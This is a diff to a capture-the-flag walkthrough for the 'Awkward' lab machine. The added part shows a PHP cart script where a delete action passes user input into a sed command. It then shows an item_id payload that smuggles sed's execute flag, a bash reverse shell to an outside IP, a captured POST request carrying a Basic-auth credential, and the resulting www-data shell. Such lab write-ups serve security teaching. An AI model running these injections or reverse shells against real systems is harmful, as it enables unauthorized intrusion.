@@ -703,6 +703,15 @@ bean@awkward:~$
 bean@awkward:~$ cat user.txt
 c14351cd4d8b1f018bed794e94c871bf
 ```
+We learn that the username for nginx is admin and since bean.hill is the admin we can use his password to login.
+
+```console
+bean@awkward:/tmp$ cat /etc/nginx/conf.d/.htpasswd 
+admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
+```
+
+Inside the Readme file we get some hints about replacing files in the cart and to try it out.
+
 ```console
 bean@awkward:/tmp$ cat /var/www/store/README.md 
 # Hat Valley - Shop Online!
@@ -722,26 +731,158 @@ bean@awkward:/tmp$ cat /var/www/store/README.md
 Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
 To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!
 ```
-We learn that the username for nginx is admin and since bean.hill is the admin we can use his password to login.
 
-```console
-bean@awkward:/tmp$ cat /etc/nginx/conf.d/.htpasswd 
-admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
+Now in the cart_actions file we find that upon deleting an item from the cart a sed command is ran on the itemID. We an abuse this sed command and paramater to give us RCE.
+
+```php
+bean@awkward:/tmp$ cat /var/www/store/cart_actions.php 
+<?php
+
+$STORE_HOME = "/var/www/store/";
+
+//check for valid hat valley store item
+function checkValidItem($filename) {
+    if(file_exists($filename)) {
+        $first_line = file($filename)[0];
+        if(strpos($first_line, "***Hat Valley") !== FALSE) {
+            return true;
+        }
+    }
+    return false;
+}
+
+//add to cart
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
+    $item_id = $_POST['item'];
+    $user_id = $_POST['user'];
+    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!
+
+    foreach($bad_chars as $bad) {
+        if(strpos($item_id, $bad) !== FALSE) {
+            echo "Bad character detected!";
+            exit;
+        }
+    }
+
+    foreach($bad_chars as $bad) {
+        if(strpos($user_id, $bad) !== FALSE) {
+            echo "Bad character detected!";
+            exit;
+        }
+    }
+
+    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
+        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
+            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
+        }
+        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
+        echo "Item added successfully!";
+    }
+    else {
+        echo "Invalid item";
+    }
+    exit;
+}
+
+//delete from cart
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
+    $item_id = $_POST['item'];
+    $user_id = $_POST['user'];
+    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!
+
+    foreach($bad_chars as $bad) {
+        if(strpos($item_id, $bad) !== FALSE) {
+            echo "Bad character detected!";
+            exit;
+        }
+    }
+
+    foreach($bad_chars as $bad) {
+        if(strpos($user_id, $bad) !== FALSE) {
+            echo "Bad character detected!";
+            exit;
+        }
+    }
+    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
+        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
+        echo "Item removed from cart";
+    }
+    else {
+        echo "Invalid item";
+    }
+    exit;
+}
+
+//fetch from cart
+if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
+    $html = "";
+    $dir = scandir("{$STORE_HOME}cart");
+    $files = array_slice($dir, 2);
+
+    foreach($files as $file) {
+        $user_id = substr($file, -18);
+        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
+            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
+            $details = array();
+            while (($line = fgets($product_file)) !== false) {
+                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
+                    array_push($details, str_replace(array("\r", "\n"), '', $line));
+                }
+            }
+            foreach($details as $cart_item) {
+                 $cart_items = explode("&", $cart_item);
+                 for($x = 0; $x < count($cart_items); $x++) {
+                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
+                 }
+                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
+            }
+        }
+    }
+    echo $html;
+    exit;
+}
+
+?>
 ```
 
 
+After capturing the request change the ```item=``` to the one below
+
 ```console
-╔══════════╣ Active Ports
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                            
-tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                                                        
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-tcp6       0      0 :::80                   :::*                    LISTEN      -                   
-tcp6       0      0 ::1:25                  :::*                    LISTEN      -  
+bean@awkward:/var/www/store/cart$ cat c007-4b53-30b-e531 
+***Hat Valley Product***
+item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
 ```
+```console
+bean@awkward:/tmp$ cat shell.sh 
+#!/bin/bash
+sh -i >& /dev/tcp/10.10.16.6/1234 0>&1
+```
+
+```
+POST /cart_actions.php HTTP/1.1
+Host: store.hat-valley.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 88
+Origin: http://store.hat-valley.htb
+Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
+Connection: close
+Referer: http://store.hat-valley.htb/cart.php
+
+item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&user=c007-4b53-30b-e531&action=delete_item
+```
+
+```console
+└─$ nc -lvnp 1234          
+listening on [any] 1234 ...
+id
+connect to [10.10.16.6] from (UNKNOWN) [10.129.228.81] 58084
+sh: 0: can't access tty; job control turned off
+$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
